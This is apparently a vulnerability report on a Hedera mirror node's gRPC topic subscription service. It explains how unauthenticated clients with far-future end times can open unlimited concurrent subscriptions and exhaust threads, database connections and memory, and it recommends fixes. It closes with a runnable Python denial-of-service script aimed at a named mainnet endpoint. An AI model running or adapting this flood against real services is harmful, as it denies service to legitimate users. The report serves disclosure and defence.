### Title
Unbounded Concurrent Subscription Resource Exhaustion via Unauthenticated gRPC Topic Subscriptions

### Summary
Any unauthenticated user can open an unlimited number of concurrent topic subscriptions by establishing multiple gRPC connections (each carrying up to `maxConcurrentCallsPerConnection` streams). Setting `endTime` to a future value causes each subscription to remain active until `endTime + endTimeInterval` elapses, with no server-side cap on total concurrent subscriptions. This allows a single attacker to exhaust bounded-elastic scheduler threads, database connection pool slots, and heap memory, degrading or denying service to legitimate users.

### Finding Description

**Code path and root cause:**

`TopicContext.isComplete()` (lines 203–215) determines when a subscription terminates:

```java
boolean isComplete() {
    if (filter.getEndTime() == null) { return false; }
    if (filter.getEndTime() < startTime) { return true; }
    return Instant.ofEpochSecond(0, filter.getEndTime())
            .plus(grpcProperties.getEndTimeInterval())   // default 30 s
            .isBefore(Instant.now());
}
```

A subscription is only torn down after `endTime + endTimeInterval` has elapsed. `endTimeInterval` defaults to 30 seconds (`GrpcProperties`, line 22). `TopicMessageFilter` validation (lines 43–51) requires only `endTime > startTime` and `startTime <= now()`; there is **no upper bound on `endTime`**.

`pastEndTime()` (lines 123–131) polls `isComplete()` every `endTimeInterval` and emits a terminal signal only when it returns `true`:

```java
return Flux.empty()
        .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                .withFixedDelay(grpcProperties.getEndTimeInterval()));
```

`subscribeTopic()` (lines 59–92) increments `subscriberCount` on subscribe and decrements on `doFinally`, but `subscriberCount` is **only a Micrometer gauge** — it is never checked against any maximum before accepting a new subscription.

The only connection-level guard is `maxConcurrentCallsPerConnection = 5` (NettyProperties, line 14; applied in GrpcConfiguration, line 33), which limits streams **per TCP connection**, not total across all connections. An attacker opens N connections × 5 streams each.

**Exploit flow:**

1. Attacker resolves a valid topic ID (public information on any Hedera network).
2. Attacker opens N TCP connections to the gRPC endpoint (no authentication required).
3. On each connection, attacker opens 5 `subscribeTopic` streams with `endTime = now + T` where T can be arbitrarily large (e.g., `Long.MAX_VALUE` nanoseconds).
4. Each subscription allocates: a `TopicContext` object, a `Flux` pipeline, a `boundedElastic` thread for the safety-check `Mono.delay`, a DB query slot for historical retrieval, and (if Redis listener) a Redis subscription.
5. `isComplete()` returns `false` for the entire duration `endTime + 30s`, keeping all resources held.
6. The attacker continuously reconnects as subscriptions expire, maintaining a steady-state flood.

### Impact Explanation

Each active subscription holds at minimum one `Schedulers.boundedElastic()` thread (safety check, line 70), one or more database connection pool slots (historical retriever + polling listener), and heap for the reactive pipeline. With no server-side cap on total subscriptions, an attacker with modest bandwidth can exhaust the bounded-elastic thread pool and the JDBC connection pool, causing `RejectedExecutionException` or connection-timeout errors for all subsequent legitimate subscribers. The impact is a full denial of the gRPC topic subscription service with no economic cost to the attacker.

### Likelihood Explanation

The attack requires only network access to the gRPC port and knowledge of one valid topic ID (trivially obtained from the public mirror node REST API). No credentials, tokens, or on-chain funds are needed. The attack is fully scriptable, repeatable, and can be sustained indefinitely. The per-connection limit of 5 streams is easily bypassed by opening additional TCP connections.

### Recommendation

1. **Enforce a global concurrent-subscription cap**: Check `subscriberCount` against a configurable maximum before accepting a new subscription in `subscribeTopic()`, returning `RESOURCE_EXHAUSTED` if exceeded.
2. **Enforce a per-IP or per-client subscription limit** using a gRPC `ServerInterceptor` that tracks active streams per remote address.
3. **Cap `endTime`**: Reject or clamp `endTime` values that exceed `now + maxAllowedWindow` (e.g., 1 hour) in `TopicMessageFilter` validation.
4. **Add connection-count limiting** at the Netty level (`maxConnectionAge`, `maxConnectionIdle`, or a total connection cap) in addition to the existing per-connection stream limit.

### Proof of Concept

```python
import grpc, threading, time
from proto import consensus_service_pb2_grpc, consensus_service_pb2
from google.protobuf.timestamp_pb2 import Timestamp

TARGET = "mirror.mainnet.hedera.com:443"
TOPIC_ID = 0  # any valid topic shard/realm/num
NUM_CONNECTIONS = 50
STREAMS_PER_CONN = 5  # matches maxConcurrentCallsPerConnection

def far_future():
    t = Timestamp()
    t.seconds = int(time.time()) + 365 * 24 * 3600  # 1 year from now
    return t

def flood(conn_id):
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    threads = []
    for _ in range(STREAMS_PER_CONN):
        req = consensus_service_pb2.ConsensusTopicQuery(
            topicID=consensus_service_pb2.TopicID(topicNum=TOPIC_ID),
            consensusEndTime=far_future()
        )
        t = threading.Thread(target=lambda: list(stub.subscribeTopic(req)))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

workers = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for w in workers: w.start()
for w in workers: w.join()
# Result: 250 concurrent subscriptions holding threads/DB connections,
# with no server-side rejection. Repeat to maintain pressure.
```